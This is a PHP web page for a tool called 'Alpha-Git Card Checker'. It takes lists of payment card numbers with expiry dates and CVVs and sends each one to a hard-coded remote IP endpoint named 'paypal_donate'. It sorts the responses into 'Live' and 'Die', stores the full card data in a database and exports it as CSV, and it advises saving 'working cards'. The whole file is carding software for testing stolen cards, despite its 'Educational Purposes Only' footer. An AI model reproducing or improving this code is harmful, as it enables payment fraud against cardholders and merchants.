



<?php
session_start();
require_once 'includes/db_connection.php';

if (!isset($_SESSION['user_id'])) {
    header("Location: login.php");
    exit();
}

$user_id = $_SESSION['user_id'];
$results = [];
$error = '';

// إعدادات الاتصال
define('API_BASE_URL', 'http://138.128.240.15:8025');
define('API_TIMEOUT', 30); // المهلة 30 ثانية
define('API_CONNECT_TIMEOUT', 30); // مهلة إنشاء الاتصال 30 ثانية
define('MAX_RETRIES', 2);  // عدد المحاولات عند الفشل

// دالة محسنة للاتصال بالـ API مع إعادة المحاولة
function checkCardAPI($card_data, $retry_count = 0) {
    $api_url = API_BASE_URL . "/paypal_donate?cc=" . urlencode(trim($card_data));
    
    if (function_exists('curl_init')) {
        return checkCardWithCurl($api_url, $card_data, $retry_count);
    }
    
    return checkCardWithFileGetContents($api_url, $card_data, $retry_count);
}

// دالة cURL مع معالجة أفضل للأخطاء
function checkCardWithCurl($api_url, $card_data, $retry_count) {
    $ch = curl_init();
    
    $options = [
        CURLOPT_URL => $api_url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => API_TIMEOUT,                 // 30s
        CURLOPT_CONNECTTIMEOUT => API_CONNECT_TIMEOUT,  // 30s
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_MAXREDIRS => 30,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_ENCODING => '',
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
        CURLOPT_USERAGENT => 'Alpha-Git-Checker/2.0',
        CURLOPT_HTTPHEADER => [
            'Accept: application/json, text/plain, */*',
            'Accept-Language: en-US,en;q=0.9',
            'Cache-Control: no-cache',
            'Connection: keep-alive',
            'Pragma: no-cache'
        ]
    ];
    
    curl_setopt_array($ch, $options);
    
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $total_time = curl_getinfo($ch, CURLINFO_TOTAL_TIME);
    $curl_error = curl_error($ch);
    curl_close($ch);
    
    error_log("API Call: $api_url | HTTP: $http_code | Time: $total_time | Error: $curl_error");
    
    if ($response !== false) {
        $decoded = @json_decode($response, true);
        if (json_last_error() === JSON_ERROR_NONE) {
            return $decoded;
        } elseif (!empty($response)) {
            return ['status' => 'Unknown', 'message' => $response, 'raw' => $response];
        }
    }
    
    if ($retry_count < MAX_RETRIES) {
        sleep(1);
        return checkCardWithCurl($api_url, $card_data, $retry_count + 1);
    }
    
    return [
        'status' => 'Error', 
        'message' => "API Request Failed after 30 seconds",
        'raw' => $response
    ];
}

// دالة file_get_contents البديلة
function checkCardWithFileGetContents($api_url, $card_data, $retry_count) {
    $context = stream_context_create([
        'http' => [
            'method' => 'GET',
            'timeout' => API_TIMEOUT, // 30s
            'ignore_errors' => true,
            'header' => implode("\r\n", [
                "User-Agent: Alpha-Git-Checker/2.0",
                "Accept: application/json, text/plain, */*",
                "Accept-Language: en-US,en;q=0.9",
                "Connection: close",
                "Cache-Control: no-cache"
            ])
        ],
        'ssl' => [
            'verify_peer' => false,
            'verify_peer_name' => false,
        ]
    ]);
    
    $response = @file_get_contents($api_url, false, $context);
    
    if ($response !== false) {
        $decoded = @json_decode($response, true);
        if (json_last_error() === JSON_ERROR_NONE) {
            return $decoded;
        } elseif (!empty($response)) {
            return ['status' => 'Unknown', 'message' => $response, 'raw' => $response];
        }
    }
    
    if ($retry_count < MAX_RETRIES) {
        sleep(1);
        return checkCardWithFileGetContents($api_url, $card_data, $retry_count + 1);
    }
    
    return ['status' => 'Error', 'message' => 'Failed after 30 seconds'];
}
// دالة لاختبار اتصال الـ API
function testAPIConnection() {
    $test_cards = [
        '5356740152660007|09|2026|514',
        '4111111111111111|12|2025|123'
    ];
    
    $results = [];
    foreach ($test_cards as $card) {
        $start = microtime(true);
        $result = checkCardAPI($card);
        $time = round(microtime(true) - $start, 2);
        
        $results[] = [
            'card' => $card,
            'result' => $result,
            'time' => $time
        ];
    }
    
    return $results;
}

// دالة لتحليل حالة البطاقة
function parseCardStatus($api_response) {
    if (!is_array($api_response)) {
        return 'Error';
    }
    
    $message = strtolower($api_response['message'] ?? '');
    $status = strtolower($api_response['status'] ?? '');
    $raw = strtolower($api_response['raw'] ?? '');
    
    // البحث عن كلمات مفتاحية في الرسالة
    $keywords = [
        'live' => ['approved', 'success', 'live', 'valid', 'active'],
        'die' => ['declined', 'rejected', 'failed', 'die', 'dead', 'invalid card'],
        'error' => ['error', 'timeout', 'failed', 'unable', 'cannot'],
        'fraud' => ['fraud', 'stolen', 'suspicious'],
        'limit' => ['insufficient', 'limit', 'exceeded'],
        'expired' => ['expired']
    ];
    
    $all_text = $message . ' ' . $status . ' ' . $raw;
    
    foreach ($keywords['live'] as $keyword) {
        if (strpos($all_text, $keyword) !== false) {
            return 'Live';
        }
    }
    
    foreach ($keywords['die'] as $keyword) {
        if (strpos($all_text, $keyword) !== false) {
            return 'Die';
        }
    }
    
    foreach ($keywords['error'] as $keyword) {
        if (strpos($all_text, $keyword) !== false) {
            return 'Error';
        }
    }
    
    // إذا لم يتم التعرف على أي حالة
    if (!empty($message) || !empty($status)) {
        return 'Unknown';
    }
    
    return 'Error';
}

// معالجة النموذج
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $action = $_POST['action'] ?? '';
    
    if ($action == 'test_api') {
        $test_results = testAPIConnection();
        $_SESSION['test_results'] = $test_results;
        header("Location: checker.php?test=1");
        exit();
    }
    
    $cards_input = trim($_POST['cards'] ?? '');
    $check_type = $_POST['check_type'] ?? 'bulk';
    $delay = intval($_POST['delay'] ?? 1000); // تأخير بالمللي ثانية
    
    if (empty($cards_input)) {
        $error = 'Please enter card data!';
    } else {
        // تقسيم البطاقات
        $cards_array = array_filter(array_map('trim', explode("\n", $cards_input)));
        
        if (empty($cards_array)) {
            $error = 'No valid card data found!';
        } else {
            $start_time = microtime(true);
            $checked_count = 0;
            $success_count = 0;
            
            foreach ($cards_array as $card_data) {
                $card_data = trim($card_data);
                if (empty($card_data)) continue;
                
                // إضافة تأخير بين الطلبات
                if ($checked_count > 0 && $delay > 0) {
                    usleep($delay * 1000);
                }
                
                // فحص البطاقة
                $api_result = checkCardAPI($card_data);
                $parsed_status = parseCardStatus($api_result);
                
                // إعداد الرسالة
                $message = '';
                if (isset($api_result['message']) && !empty($api_result['message'])) {
                    $message = $api_result['message'];
                } elseif (isset($api_result['status'])) {
                    $message = $api_result['status'];
                } else {
                    $message = 'No response from API';
                }
                
                // اختصار الرسالة الطويلة
                if (strlen($message) > 100) {
                    $message = substr($message, 0, 100) . '...';
                }
                
                // حفظ في قاعدة البيانات
                $stmt = $conn->prepare("INSERT INTO card_checks (user_id, card_number, status, message) VALUES (?, ?, ?, ?)");
                $stmt->bind_param("isss", $user_id, $card_data, $parsed_status, $message);
                
                if ($stmt->execute()) {
                    $success_count++;
                }
                
                $results[] = [
                    'card' => $card_data,
                    'status' => $parsed_status,
                    'message' => $message,
                    'raw_response' => json_encode($api_result),
                    'time' => microtime(true)
                ];
                
                $checked_count++;
                
                // إذا كان فحص فردي
                if ($check_type == 'single') {
                    break;
                }
            }
            
            $end_time = microtime(true);
            $total_time = round($end_time - $start_time, 2);
            
            // حفظ إحصائيات الجلسة
            $_SESSION['last_check_stats'] = [
                'total' => $checked_count,
                'success' => $success_count,
                'time' => $total_time
            ];
        }
    }
}

// الحصول على نتائج اختبار الـ API إذا كان موجودًا
$test_results = $_SESSION['test_results'] ?? [];
if (isset($_GET['test']) && !empty($test_results)) {
    unset($_SESSION['test_results']);
}

// الحصول على آخر النتائج
$recent_stmt = $conn->prepare("SELECT * FROM card_checks WHERE user_id = ? ORDER BY check_date DESC LIMIT 50");
$recent_stmt->bind_param("i", $user_id);
$recent_stmt->execute();
$recent_results = $recent_stmt->get_result()->fetch_all(MYSQLI_ASSOC);
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Alpha-Git | Card Checker</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="stylesheet" href="assets/css/style.css">
    <style>
        .status-badge {
            padding: 5px 10px;
            border-radius: 5px;
            font-weight: bold;
            font-size: 0.8rem;
            min-width: 60px;
            text-align: center;
            display: inline-block;
        }
        .status-live { background: #28a745; color: white; }
        .status-die { background: #dc3545; color: white; }
        .status-error { background: #ffc107; color: #212529; }
        .status-unknown { background: #6c757d; color: white; }
        .status-fraud { background: #8b0000; color: white; }
        .status-limit { background: #fd7e14; color: white; }
        .status-expired { background: #17a2b8; color: white; }
        
        .card-preview {
            font-family: monospace;
            background: #f8f9fa;
            padding: 5px;
            border-radius: 4px;
            margin: 2px 0;
            font-size: 0.9rem;
        }
        
        .api-status {
            padding: 10px;
            border-radius: 5px;
            margin-bottom: 15px;
        }
        .api-online { background: #d4edda; border: 1px solid #c3e6cb; }
        .api-offline { background: #f8d7da; border: 1px solid #f5c6cb; }
        
        .progress-container {
            margin: 20px 0;
        }
        
        .result-row {
            transition: all 0.3s;
        }
        .result-row:hover {
            background-color: #f8f9fa;
        }
        
        .tooltip-inner {
            max-width: 300px;
        }
    </style>
</head>
<body>
    <!-- Navigation -->
    <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
        <div class="container">
            <a class="navbar-brand" href="#">
                <i class="fas fa-code-branch"></i> Alpha-Git
            </a>
            <div class="collapse navbar-collapse">
                <ul class="navbar-nav ms-auto">
                    <li class="nav-item">
                        <a class="nav-link" href="index.php">Dashboard</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link active" href="checker.php">Card Checker</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="generator.php">Generator</a>
                    </li>
                    <li class="nav-item dropdown">
                        <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-bs-toggle="dropdown">
                            <i class="fas fa-user"></i> <?php echo htmlspecialchars($_SESSION['username']); ?>
                        </a>
                        <ul class="dropdown-menu">
                            <li><a class="dropdown-item" href="profile.php">Profile</a></li>
                            <li><hr class="dropdown-divider"></li>
                            <li><a class="dropdown-item" href="logout.php">Logout</a></li>
                        </ul>
                    </li>
                </ul>
            </div>
        </div>
    </nav>

    <!-- Card Checker Content -->
    <div class="container mt-4">
        <div class="row">
            <div class="col-md-12">
                <!-- API Status Card -->
                <div class="card mb-4">
                    <div class="card-header d-flex justify-content-between align-items-center">
                        <h5 class="mb-0"><i class="fas fa-plug"></i> API Status</h5>
                        <form method="POST" action="" class="d-inline">
                            <input type="hidden" name="action" value="test_api">
                            <button type="submit" class="btn btn-sm btn-outline-info">
                                <i class="fas fa-sync-alt"></i> Test Connection
                            </button>
                        </form>
                    </div>
                    <div class="card-body">
                        <?php if (!empty($test_results)): ?>
                            <div class="api-status api-online">
                                <h6><i class="fas fa-check-circle text-success"></i> API is Online</h6>
                                <?php foreach ($test_results as $test): ?>
                                    <div class="mb-2">
                                        <small class="text-muted">Test Card: <?php echo htmlspecialchars($test['card']); ?></small><br>
                                        <small>Response: <?php echo htmlspecialchars(json_encode($test['result'])); ?></small><br>
                                        <small>Time: <?php echo $test['time']; ?>s</small>
                                    </div>
                                <?php endforeach; ?>
                            </div>
                        <?php else: ?>
                            <div class="api-status api-offline">
                                <h6><i class="fas fa-exclamation-triangle text-warning"></i> API Status Unknown</h6>
                                <p class="mb-0">Click "Test Connection" to check API availability</p>
                            </div>
                        <?php endif; ?>
                        
                        <div class="row mt-3">
                            <div class="col-md-6">
                                <div class="alert alert-info">
                                    <h6><i class="fas fa-info-circle"></i> API Information</h6>
                                    <p class="mb-1"><strong>Endpoint:</strong> <?php echo API_BASE_URL; ?>/check</p>
                                    <p class="mb-1"><strong>Timeout:</strong> <?php echo API_TIMEOUT; ?> seconds</p>
                                    <p class="mb-0"><strong>Max Retries:</strong> <?php echo MAX_RETRIES; ?></p>
                                </div>
                            </div>
                            <div class="col-md-6">
                                <div class="alert alert-warning">
                                    <h6><i class="fas fa-exclamation-triangle"></i> Troubleshooting Tips</h6>
                                    <ul class="mb-0">
                                        <li>Increase delay between requests</li>
                                        <li>Check firewall/network settings</li>
                                        <li>Verify API server is reachable</li>
                                        <li>Try checking single cards first</li>
                                    </ul>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Main Checker Card -->
                <div class="card">
                    <div class="card-header">
                        <h4><i class="fas fa-credit-card"></i> Card Checker</h4>
                    </div>
                    <div class="card-body">
                        <?php if ($error): ?>
                            <div class="alert alert-danger"><?php echo $error; ?></div>
                        <?php endif; ?>
                        
                        <?php if (isset($total_time)): ?>
                            <div class="alert alert-success">
                                <i class="fas fa-check-circle"></i> 
                                Checked <?php echo $checked_count; ?> card(s) in <?php echo $total_time; ?> seconds
                                (<?php echo round($checked_count / $total_time, 2); ?> cards/sec)
                            </div>
                        <?php endif; ?>
                        
                        <form method="POST" action="" id="checkerForm">
                            <div class="row">
                                <div class="col-md-8">
                                    <div class="mb-3">
                                        <label class="form-label">Card Data (one per line):</label>
                                        <textarea class="form-control" name="cards" id="cardsInput" rows="8" 
                                                  placeholder="5356740152660007|09|2026|514
4111111111111111|12|2025|123
5105105105105100|06|2026|321" required><?php echo isset($_POST['cards']) ? htmlspecialchars($_POST['cards']) : ''; ?></textarea>
                                        <div class="form-text">
                                            Format: <code>CardNumber|Month|Year|CVV</code>
                                        </div>
                                    </div>
                                    
                                    <div class="row">
                                        <div class="col-md-6">
                                            <div class="mb-3">
                                                <label class="form-label">Check Type:</label>
                                                <select class="form-select" name="check_type" id="checkType">
                                                    <option value="bulk">Bulk Check (All Cards)</option>
                                                    <option value="single">Single Check (First Card Only)</option>
                                                </select>
                                            </div>
                                        </div>
                                        <div class="col-md-6">
                                            <div class="mb-3">
                                                <label class="form-label">Delay Between Requests:</label>
                                                <div class="input-group">
                                                    <input type="number" class="form-control" name="delay" 
                                                           value="<?php echo isset($_POST['delay']) ? $_POST['delay'] : '1000'; ?>" 
                                                           min="0" max="10000" step="100">
                                                    <span class="input-group-text">ms</span>
                                                </div>
                                                <div class="form-text">Recommended: 1000ms (1 second)</div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                
                                <div class="col-md-4">
                                    <div class="mb-3">
                                        <label class="form-label">Quick Actions:</label>
                                        <div class="list-group">
                                            <button type="button" class="list-group-item list-group-item-action" 
                                                    onclick="loadSample('test')">
                                                <i class="fas fa-vial"></i> Load Test Cards
                                            </button>
                                            <button type="button" class="list-group-item list-group-item-action" 
                                                    onclick="loadSample('visa')">
                                                <i class="fab fa-cc-visa"></i> Visa Samples
                                            </button>
                                            <button type="button" class="list-group-item list-group-item-action" 
                                                    onclick="loadSample('mastercard')">
                                                <i class="fab fa-cc-mastercard"></i> MasterCard Samples
                                            </button>
                                            <button type="button" class="list-group-item list-group-item-action text-danger" 
                                                    onclick="clearForm()">
                                                <i class="fas fa-trash"></i> Clear All
                                            </button>
                                        </div>
                                    </div>
                                    
                                    <div class="mb-3">
                                        <label class="form-label">Status Legend:</label>
                                        <div class="d-flex flex-wrap gap-2 mb-2">
                                            <span class="status-badge status-live" data-bs-toggle="tooltip" title="Card is active and working">Live</span>
                                            <span class="status-badge status-die" data-bs-toggle="tooltip" title="Card is declined or invalid">Die</span>
                                            <span class="status-badge status-error" data-bs-toggle="tooltip" title="API error or timeout">Error</span>
                                            <span class="status-badge status-unknown" data-bs-toggle="tooltip" title="Unknown response">Unknown</span>
                                        </div>
                                    </div>
                                    
                                    <div class="alert alert-secondary">
                                        <small>
                                            <strong>Note:</strong><br>
                                            • Use delays for bulk checking<br>
                                            • Start with single card test<br>
                                            • Save working cards for future use
                                        </small>
                                    </div>
                                </div>
                            </div>
                            
                            <div class="d-flex gap-2">
                                <button type="submit" class="btn btn-primary">
                                    <i class="fas fa-play-circle"></i> Start Checking
                                </button>
                                <button type="button" class="btn btn-warning" onclick="clearForm()">
                                    <i class="fas fa-eraser"></i> Clear
                                </button>
                                <?php if (!empty($results)): ?>
                                    <button type="button" class="btn btn-success" onclick="exportResults()">
                                        <i class="fas fa-download"></i> Export
                                    </button>
                                <?php endif; ?>
                            </div>
                        </form>
                        
                        <!-- Results Section -->
                        <?php if (!empty($results)): ?>
                            <div class="mt-4" id="resultsSection">
                                <h5><i class="fas fa-list-check"></i> Results</h5>
                                
                                <div class="table-responsive">
                                    <table class="table table-hover">
                                        <thead>
                                            <tr>
                                                <th width="25%">Card</th>
                                                <th width="15%">Status</th>
                                                <th width="45%">Message</th>
                                                <th width="15%">Actions</th>
                                            </tr>
                                        </thead>
                                        <tbody>
                                            <?php foreach ($results as $index => $result): ?>
                                                <?php 
                                                $status_class = 'status-' . strtolower($result['status']);
                                                $card_parts = explode('|', $result['card']);
                                                $card_number = $card_parts[0] ?? $result['card'];
                                                ?>
                                                <tr class="result-row">
                                                    <td>
                                                        <div class="card-preview" data-bs-toggle="tooltip" title="<?php echo htmlspecialchars($result['card']); ?>">
                                                            <?php echo htmlspecialchars($card_number); ?>
                                                        </div>
                                                    </td>
                                                    <td>
                                                        <span class="status-badge <?php echo $status_class; ?>">
                                                            <?php echo htmlspecialchars($result['status']); ?>
                                                        </span>
                                                    </td>
                                                    <td>
                                                        <small><?php echo htmlspecialchars($result['message']); ?></small>
                                                    </td>
                                                    <td>
                                                        <div class="btn-group btn-group-sm">
                                                            <button class="btn btn-outline-info" 
                                                                    onclick="copyCard('<?php echo addslashes($result['card']); ?>')"
                                                                    data-bs-toggle="tooltip" title="Copy card">
                                                                <i class="fas fa-copy"></i>
                                                            </button>
                                                            <button class="btn btn-outline-secondary" 
                                                                    onclick="viewDetails(<?php echo $index; ?>)"
                                                                    data-bs-toggle="tooltip" title="View details">
                                                                <i class="fas fa-eye"></i>
                                                            </button>
                                                        </div>
                                                    </td>
                                                </tr>
                                            <?php endforeach; ?>
                                        </tbody>
                                    </table>
                                </div>
                                
                                <div class="d-flex justify-content-between align-items-center mt-3">
                                    <div>
                                        <button class="btn btn-sm btn-outline-success" onclick="saveResults()">
                                            <i class="fas fa-save"></i> Save Results
                                        </button>
                                        <button class="btn btn-sm btn-outline-danger" onclick="clearResults()">
                                            <i class="fas fa-times"></i> Clear Results
                                        </button>
                                    </div>
                                    <div class="text-muted">
                                        <small>Total: <?php echo count($results); ?> cards checked</small>
                                    </div>
                                </div>
                            </div>
                        <?php endif; ?>
                        
                        <!-- Recent Checks -->
                        <?php if (!empty($recent_results)): ?>
                            <div class="mt-4">
                                <h6><i class="fas fa-history"></i> Recent Checks</h6>
                                <div class="table-responsive">
                                    <table class="table table-sm">
                                        <thead>
                                            <tr>
                                                <th>Time</th>
                                                <th>Card</th>
                                                <th>Status</th>
                                                <th>Result</th>
                                            </tr>
                                        </thead>
                                        <tbody>
                                            <?php foreach ($recent_results as $row): ?>
                                                <?php 
                                                $status_class = 'status-' . strtolower($row['status']);
                                                $time = date('H:i:s', strtotime($row['check_date']));
                                                ?>
                                                <tr>
                                                    <td><small><?php echo $time; ?></small></td>
                                                    <td><small><code><?php echo substr($row['card_number'], 0, 15) . '...'; ?></code></small></td>
                                                    <td>
                                                        <span class="status-badge <?php echo $status_class; ?>">
                                                            <?php echo htmlspecialchars($row['status']); ?>
                                                        </span>
                                                    </td>
                                                    <td><small><?php echo htmlspecialchars(substr($row['message'], 0, 40)); ?>...</small></td>
                                                </tr>
                                            <?php endforeach; ?>
                                        </tbody>
                                    </table>
                                </div>
                            </div>
                        <?php endif; ?>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Details Modal -->
    <div class="modal fade" id="detailsModal" tabindex="-1">
        <div class="modal-dialog modal-lg">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title">Card Details</h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
                </div>
                <div class="modal-body" id="detailsContent">
                    Loading...
                </div>
            </div>
        </div>
    </div>

    <!-- Footer -->
    <footer class="bg-dark text-white mt-5 py-3">
        <div class="container text-center">
            <p>&copy; 2024 Alpha-Git. All rights reserved. | Educational Purposes Only</p>
        </div>
    </footer>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        // تهيئة tooltips
        document.addEventListener('DOMContentLoaded', function() {
            var tooltipTriggerList = [].slice.call(document.querySelectorAll('[data-bs-toggle="tooltip"]'));
            var tooltipList = tooltipTriggerList.map(function (tooltipTriggerEl) {
                return new bootstrap.Tooltip(tooltipTriggerEl);
            });
        });
        
        // عينات البطاقات
        const cardSamples = {
          
            mastercard: [
                '5431111111111111|08|2026|321',
            ]
        };
        
        // تحميل عينة
        function loadSample(type) {
            if (cardSamples[type]) {
                document.getElementById('cardsInput').value = cardSamples[type].join('\n');
            }
        }
        
        // مسح النموذج
        function clearForm() {
            if (confirm('Are you sure you want to clear all card data?')) {
                document.getElementById('cardsInput').value = '';
                document.getElementById('checkType').value = 'bulk';
                document.querySelector('input[name="delay"]').value = '1000';
                
                const resultsSection = document.getElementById('resultsSection');
                if (resultsSection) {
                    resultsSection.remove();
                }
            }
        }
        
        // نسخ البطاقة
        function copyCard(cardData) {
            navigator.clipboard.writeText(cardData).then(() => {
                showToast('Card copied to clipboard!', 'success');
            }).catch(err => {
                console.error('Copy failed:', err);
                showToast('Failed to copy card', 'error');
            });
        }
        
        // عرض التفاصيل
        function viewDetails(index) {
            const results = <?php echo json_encode($results); ?>;
            if (results[index]) {
                const result = results[index];
                let details = `
                    <div class="card">
                        <div class="card-header">
                            <h6>Card Information</h6>
                        </div>
                        <div class="card-body">
                            <p><strong>Full Card Data:</strong><br>
                            <code>${result.card}</code></p>
                            
                            <p><strong>Status:</strong><br>
                            <span class="status-badge status-${result.status.toLowerCase()}">${result.status}</span></p>
                            
                            <p><strong>Message:</strong><br>
                            ${result.message}</p>
                            
                            <p><strong>Raw API Response:</strong></p>
                            <pre style="max-height: 200px; overflow: auto; background: #f8f9fa; padding: 10px; border-radius: 5px;">${result.raw_response}</pre>
                        </div>
                    </div>
                `;
                
                document.getElementById('detailsContent').innerHTML = details;
                new bootstrap.Modal(document.getElementById('detailsModal')).show();
            }
        }
        
        // تصدير النتائج
        function exportResults() {
            const results = <?php echo json_encode($results); ?>;
            if (!results || results.length === 0) {
                showToast('No results to export!', 'warning');
                return;
            }
            
            let csvContent = "Card Number,Month,Year,CVV,Status,Message,Time\n";
            results.forEach(result => {
                const cardParts = result.card.split('|');
                const cardNumber = cardParts[0] || '';
                const month = cardParts[1] || '';
                const year = cardParts[2] || '';
                const cvv = cardParts[3] || '';
                
                csvContent += `"${cardNumber}","${month}","${year}","${cvv}","${result.status}","${result.message.replace(/"/g, '""')}","${new Date().toISOString()}"\n`;
            });
            
            const blob = new Blob([csvContent], { type: 'text/csv' });
            const url = window.URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `card_results_${new Date().toISOString().slice(0,19).replace(/:/g, '-')}.csv`;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            window.URL.revokeObjectURL(url);
            
            showToast('Results exported successfully!', 'success');
        }
        
        // حفظ النتائج
        function saveResults() {
            const results = <?php echo json_encode($results); ?>;
            if (!results || results.length === 0) {
                showToast('No results to save!', 'warning');
                return;
            }
            
            // هنا يمكنك إضافة كود لحفظ النتائج في قاعدة البيانات
            showToast('Save feature coming soon!', 'info');
        }
        
        // مسح النتائج
        function clearResults() {
            if (confirm('Are you sure you want to clear all results?')) {
                const resultsSection = document.getElementById('resultsSection');
                if (resultsSection) {
                    resultsSection.remove();
                }
                showToast('Results cleared!', 'success');
            }
        }
        
        // عرض إشعار
        function showToast(message, type = 'info') {
            // يمكنك إضافة مكتبة toast هنا أو استخدام alert بسيط
            alert(message);
        }
        
        // التحقق من النموذج قبل الإرسال
        document.getElementById('checkerForm').addEventListener('submit', function(e) {
            const cardsInput = document.getElementById('cardsInput').value.trim();
            if (!cardsInput) {
                e.preventDefault();
                alert('Please enter at least one card!');
                return;
            }
            
            const delay = parseInt(document.querySelector('input[name="delay"]').value);
            if (delay < 0 || delay > 10000) {
                e.preventDefault();
                alert('Delay must be between 0 and 10000 milliseconds!');
                return;
            }
            
            // إظهار رسالة تأكيد للفحص الجماعي
            const checkType = document.getElementById('checkType').value;
            const cardCount = cardsInput.split('\n').filter(line => line.trim()).length;
            
            if (checkType === 'bulk' && cardCount > 10) {
                if (!confirm(`You are about to check ${cardCount} cards. This may take some time. Continue?`)) {
                    e.preventDefault();
                }
            }
        });
    </script>
</body>
</html>
